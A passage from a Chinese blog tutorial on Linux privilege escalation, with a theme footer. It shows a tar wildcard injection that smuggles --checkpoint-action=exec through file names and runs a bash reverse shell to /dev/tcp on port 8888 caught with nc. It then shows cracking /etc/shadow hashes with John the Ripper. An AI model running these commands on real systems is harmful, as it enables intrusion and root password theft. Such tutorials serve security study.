+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-string">&quot; &quot;</span> &gt; <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>--checkpoint=<span class="hljs-number">1</span><br>echo <span class="hljs-string">&quot; &quot;</span> &gt; <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>--checkpoint-action=exec=<span class="hljs-string">&#x27;bash shell.sh&#x27;</span><br>echo <span class="hljs-string">&quot;bash -i &gt;&amp;/dev/tcp/10.210.100..128/8888 0&gt;&amp;1&quot;</span> &gt; <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>shell.sh<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110170752699.png" srcset="/img/loading.gif" lazyload alt="image-20240110170752699"></p>
+<p>4.使用NC进行监听，等待sh脚本被执行，连接NC</p>
+<p><img src="/img/image-20240110170816097.png" srcset="/img/loading.gif" lazyload alt="image-20240110170816097"></p>
+<h2 id="7-破解明文密码提权"><a href="#7-破解明文密码提权" class="headerlink" title="7.破解明文密码提权"></a>7.破解明文密码提权</h2><h3 id="提权原理-5"><a href="#提权原理-5" class="headerlink" title="提权原理"></a>提权原理</h3><p>大多数linux系统的密码都和&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。</p>
+<p><strong>shadow是仅 root可读写的</strong>，当管理员的passwd和shadow一些权限配置不当就可能会导致提权</p>
+<h3 id="提权环境-2"><a href="#提权环境-2" class="headerlink" title="提权环境"></a>提权环境</h3><p>主要是查看当前的shadow文件是否可以读取，主要有以下几种方式</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>、赋予了文件<span class="hljs-number">777</span>权限<br><span class="hljs-attribute">2</span>、可以使用sudo查看<br><span class="hljs-attribute">3</span>、cat等命令赋予了SUID权限<br></code></pre></td></tr></table></figure>
+
+<h3 id="提权复现-1"><a href="#提权复现-1" class="headerlink" title="提权复现"></a>提权复现</h3><p>root的账号密码如何破解</p>
+<p>1.能够读取到shadow文件</p>
+<p><img src="/img/image-20240110171414303.png" srcset="/img/loading.gif" lazyload alt="image-20240110171414303"></p>
+<p>2.使用工具破解密码</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">john <span class="hljs-attribute">--wordlist</span>=passwd.txt + shadow.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240110171835109.png" srcset="/img/loading.gif" lazyload alt="image-20240110171835109"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%8F%90%E6%9D%83/" class="category-chain-item">提权</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>提权-linux提权</div>
+      <div>http://example.com/2024/01/10/提权-linux提权/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>r1</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/09/%E6%8F%90%E6%9D%83-windows%E7%BB%95%E8%BF%87UAC%E6%8F%90%E6%9D%83/" title="提权-windows绕过UAC提权">
+                        <span class="hidden-mobile">提权-windows绕过UAC提权</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
